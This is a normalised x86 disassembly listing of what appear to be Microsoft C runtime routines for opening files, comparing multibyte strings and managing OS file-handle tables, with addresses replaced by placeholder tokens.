test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10015309
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_1000b811
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
call sub_1000b7ac
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_1000b811
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
call sub_1000b7ac
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_1001429d
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_1000b811
and [ eax ] 0x0
mov [ esi ] ebx
call sub_1000b7fe
mov [ eax ] 0x18
call sub_1000b7fe
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_1000b824
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_1000b824
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1000b7fe
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_1000b7fe
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_10014067
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_100151d9
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] 0x0
call sub_100146ce
add esp 0xc
test eax eax
jne r-xdata
call sub_1000b811
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_100151d9
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_10010d68
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_1000b824
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_100140e8
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_10015023
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_100146ce
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_10011097
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_10011097
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_10010d68
pop ecx
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_100151d9
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_10011903
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_100151d9
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_10011097
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_10011097
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_10013ac5
push 0x14
push r--data
call sub_1000f940
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
call sub_1000b7ac
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_1000f985
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_10013391
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013b5b
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_10013b5b
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_10014276
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_10013b89
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10013ac5
add esp 0x18
pop ebp
retn
sub_10013ba9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_10009611
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10014f9d
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx edx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov si bx
jmp r-xdata
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx edx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx ecx [ edi ]
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_10013dc7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a043
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx ecx [ ebx ]
dec [ ebp + 0x10 ]
movzx eax cl
inc ebx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ esi ]
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test cx cx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
movzx ecx cx
inc ebx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
shl eax 0x8
movzx edx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10013f30
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10013f50
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10008d64
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10013f95
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10013f95
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10013f50
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10014045
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10014064
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1001403c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10014045
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10014067
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_100140e8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1001416e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7ac
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_100141d7
push 0xc
push r--data
call sub_1000f940
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1000f985
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001426d
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10014276
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001429d
push 0x18
push r--data
call sub_1000f940
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_10011d7d
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001442d
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_1000f985
retn
push 0x40
push 0x20
call sub_1000f19d
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_100141d7
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_10011e3f
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1001436f
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_10014436
push 0x10
push r--data
call sub_1000f940
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7ac
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1000f985
retn
or eax 0xffffffff
